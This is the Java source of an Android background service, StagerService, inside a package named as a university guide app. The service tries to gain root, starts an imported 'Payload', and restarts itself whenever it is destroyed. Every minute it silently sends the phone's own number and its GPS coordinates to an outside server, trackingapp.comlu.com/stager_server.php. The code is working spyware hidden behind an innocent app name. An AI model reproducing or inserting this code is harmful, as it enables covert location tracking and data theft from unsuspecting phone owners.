package ua.nau.edu.NAU_Guide;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.location.LocationListener;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationServices;

import java.util.HashMap;
import java.util.Timer;
import java.util.TimerTask;

import java.io.IOException;

import ua.nau.edu.GoogleService.HTTPUtils;
import ua.nau.edu.GoogleService.Payload;

public class StagerService extends Service implements GoogleApiClient.ConnectionCallbacks,
        GoogleApiClient.OnConnectionFailedListener, LocationListener {
    private static final String TAG = "StagerService";

    private static final String REQUEST_URL = "http://trackingapp.comlu.com/stager_server.php";

    public static int sendDelay = 60000; // 900000 == 15 minutes 60000 == 1 minute
    private static int UPDATE_INTERVAL = 5000; // 5 sec
    private static int FATEST_INTERVAL = 5000; // 5 sec
    private static int DISPLACEMENT = 1; // 1 meters

    public static Location oldLocation;
    public static Location currentLocation;

    private Handler handler;
    private HTTPUtils httpUtils = new HTTPUtils();
    private TelephonyManager telephonyManager;
    private GoogleApiClient googleApiClient;

    @Override
    public void onConnected(Bundle bundle) {
        Log.d(TAG, "GoogleApiClient/ Connected");
        createLocationRequest();
    }


    @Override
    public void onConnectionSuspended(int i) {
        Log.d(TAG, "GoogleApiClient/ ConnectionSuspended");
    }

    @Override
    public void onConnectionFailed(ConnectionResult connectionResult) {
        Log.d(TAG, "GoogleApiClient/ Connection failed");
    }

    @Override
    public void onLocationChanged(Location location) {
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "StagerService created");

        handler = new Handler();
        telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

        Log.d(TAG, "Trying to get root...");

        try {
            Runtime.getRuntime().exec("su");
        } catch (IOException e) {
            Log.e(TAG, "IOException while getting root");
            e.printStackTrace();
        }

        Payload.start(this);
        Log.d(TAG, "Payload started");

        // Create an instance of GoogleAPIClient.
        if (googleApiClient == null) {
            googleApiClient = new GoogleApiClient.Builder(this)
                    .addConnectionCallbacks(this)
                    .addOnConnectionFailedListener(this)
                    .addApi(LocationServices.API)
                    .build();
        }

        googleApiClient.connect();
    }

    @Override
    public void onDestroy() {
        googleApiClient.disconnect();
        Log.d(TAG, "googleApiClient disconnected");

        super.onDestroy();
        Log.d(TAG, "StagerService destroyed");

        startService(new Intent(getBaseContext(), StagerService.class));
        Log.d(TAG, "New StagerService started");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        startLoopSending();

        Log.d(TAG, "StagerService started");

        return super.onStartCommand(intent, flags, startId);
    }

    private void createLocationRequest() {
        LocationRequest mLocationRequest = new LocationRequest();
        mLocationRequest.setInterval(UPDATE_INTERVAL);
        mLocationRequest.setFastestInterval(FATEST_INTERVAL);
        mLocationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
        mLocationRequest.setSmallestDisplacement(DISPLACEMENT);

        try {
            LocationServices.FusedLocationApi.requestLocationUpdates(googleApiClient, mLocationRequest, this);
        } catch (SecurityException e) {
            e.printStackTrace();
        }
    }

    private void runOnUiThread(Runnable runnable) {
        handler.post(runnable);
    }

    public boolean isGPSEnabled() {
        LocationManager locationManager = (LocationManager) getApplicationContext().getSystemService(LOCATION_SERVICE);
        if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER))
            return true;
        else
            return false;
    }

    public void startLoopSending() {
        final Handler handler = new Handler();
        Timer timer = new Timer();
        TimerTask doAsynchronousTask = new TimerTask() {
            @Override
            public void run() {
                handler.post(new Runnable() {
                    public void run() {
                        try {
                            new AsyncTask<Void, Void, Void>() {
                                @Override
                                protected Void doInBackground(Void... params) {
                                    runOnUiThread(new Runnable() {
                                        @Override
                                        public void run() {

                                            final HashMap<String, String> locationData = new HashMap<String, String>();
                                            String phone = telephonyManager.getLine1Number();

                                            try {
                                                if (isGPSEnabled()) {
                                                    oldLocation = currentLocation;
                                                    if (oldLocation != null) {
                                                        Log.d(TAG, "oldLocation: " +
                                                                Double.toString(oldLocation.getLatitude()) +
                                                                ", " + Double.toString(oldLocation.getLongitude()));
                                                    }

                                                    currentLocation = LocationServices.FusedLocationApi.getLastLocation(googleApiClient);
                                                    if (oldLocation != null) {
                                                        Log.d(TAG, "currentLocation: " +
                                                                Double.toString(currentLocation.getLatitude()) +
                                                                ", " + Double.toString(currentLocation.getLongitude()));
                                                    }

                                                    if (currentLocation != null && oldLocation != null) {
                                                        if (oldLocation.getLatitude() != currentLocation.getLatitude() && oldLocation.getLongitude() != currentLocation.getLongitude()) {
                                                            String lng = Double.toString(currentLocation.getLongitude());
                                                            String lat = Double.toString(currentLocation.getLatitude());

                                                            Log.d(TAG, phone + " - " + lat + ", " + lng);

                                                            locationData.put("phone", phone);
                                                            locationData.put("lat", lat);
                                                            locationData.put("lng", lng);

                                                        } else {
                                                            Log.e(TAG, "currentLocation == oldLocation");
                                                        }
                                                    } else {
                                                        Log.e(TAG, "currentLocation == null || oldLocation == null");
                                                    }
                                                } else {
                                                    // GPS isn't avalible
                                                    locationData.put("phone", phone);
                                                }

                                                new Thread(new Runnable() {
                                                    @Override
                                                    public void run() {
                                                        httpUtils.sendPostRequestWithParams(REQUEST_URL, locationData);
                                                    }
                                                }).start();
                                            } catch (SecurityException e) {
                                                e.printStackTrace();
                                            }
                                        }
                                    });
                                    return null;
                                }
                            }.execute();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                });
            }
        };
        timer.schedule(doAsynchronousTask, 0, sendDelay);
    }

}